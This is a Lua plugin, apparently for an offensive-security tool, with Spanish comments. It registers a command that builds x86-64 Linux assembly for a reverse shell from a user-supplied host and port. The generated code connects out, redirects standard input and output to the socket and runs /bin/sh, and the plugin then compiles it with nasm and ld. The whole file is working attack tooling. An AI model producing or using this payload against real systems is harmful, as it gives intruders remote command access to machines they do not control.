function generate_linux_asm_reverse_shell()
    local lhost = app.params["lhost"]
    local lport = app.params["lport"]

    if not lhost or not lport then
        return "Error: lhost or lport not defined."
    end

    -- Convertir la IP a formato hexadecimal
    local ip_octets = {}
    for octet in lhost:gmatch("%d+") do
        table.insert(ip_octets, tonumber(octet))
    end

    if #ip_octets ~= 4 or not all(ip_octets, function(x) return x >= 0 and x <= 255 end) then
        return "Error: lhost must be a valid IP address (example: 192.168.1.2)."
    end

    local ip_hex = string.format("0x%02X%02X%02X%02X", ip_octets[4], ip_octets[3], ip_octets[2], ip_octets[1])

    -- Convertir el puerto a formato hexadecimal
    local port_num = tonumber(lport)
    if not port_num or port_num < 1 or port_num > 65535 then
        return "Error: lport must be an int between 1 and 65535."
    end

    local port_hex = string.format("0x%04X", ((port_num >> 8) & 0xFF) | ((port_num << 8) & 0xFF00))

    -- Generar el código ensamblador NASM
    local asm_code = [[
section .text
    global _start

_start:
    ; Create socket
    mov rax, 41              ; syscall: socket
    mov rdi, 2               ; AF_INET (2)
    mov rsi, 1               ; SOCK_STREAM (1)
    mov rdx, 0               ; Protocol (0)
    syscall

    ; Save the descriptor of the socket
    mov rdi, rax             ; save fd of socket in rdi

    ; Config the struct sockaddr_in
    xor rax, rax
    sub rsp, 16              ; Allocate 16 bytes on the stack for sockaddr_in
    mov word [rsp], 2        ; sin_family (AF_INET = 2)
    mov word [rsp+2], ]] .. port_hex .. [[ ; sin_port (little-endian)
    mov dword [rsp+4], ]] .. ip_hex .. [[ ; sin_addr (little-endian)
    mov qword [rsp+8], 0     ; sin_zero (8 bytes of padding)

    ; Connect to the socket
    mov rax, 42              ; syscall: connect
    mov rsi, rsp             ; pointer to sockaddr_in
    mov rdx, 16              ; sizeof(sockaddr_in) = 16 bytes
    syscall

    ; Check if connect failed
    cmp rax, 0
    jl _exit                 ; Exit if connect failed

    ; Redirect stdin, stdout, stderr to the socket
    xor rsi, rsi
    mov rax, 33              ; syscall: dup2
    mov rsi, 0               ; stdin (0)
    syscall

    mov rax, 33              ; syscall: dup2
    mov rsi, 1               ; stdout (1)
    syscall

    mov rax, 33              ; syscall: dup2
    mov rsi, 2               ; stderr (2)
    syscall

    ; Exec the shell
    mov rax, 59              ; syscall: execve
    lea rdi, [rel bin_sh]    ; pointer to "/bin/sh"
    xor rsi, rsi             ; argv = NULL
    xor rdx, rdx             ; envp = NULL
    syscall

_exit:
    ; Exit if error
    mov rax, 60              ; syscall: exit
    xor rdi, rdi             ; exit code 0
    syscall

section .data
    bin_sh db "/bin/sh", 0
]]

    -- Guardar el código ensamblador en un archivo
    local file_path = "sessions/reverseshell.asm"
    local file = io.open(file_path, "w")
    if not file then
        return "Error: Could not create file at " .. file_path
    end

    file:write(asm_code)
    file:close()

    -- Intentar compilar y vincular el binario
    local success = true
    local output = ""

    -- Compilar con nasm
    local nasm_command = "nasm -f elf64 " .. file_path .. " -o sessions/reverseshell.o && ld sessions/reverseshell.o -o sessions/reverseshell"
    local nasm_result = os.execute(nasm_command)

    -- Retornar el resultado
    if nasm_result then
        return "Shellcode generated successfully. Binary saved at sessions/reverseshell."
    else
        return "Shellcode.asm generated, but there were errors during compilation:\n" .. output
    end
end

-- Función auxiliar 'all'
function all(tbl, condition)
    for _, v in ipairs(tbl) do
        if not condition(v) then
            return false
        end
    end
    return true
end

-- Registrar el comando
register_command("generate_linux_asm_reverse_shell", generate_linux_asm_reverse_shell)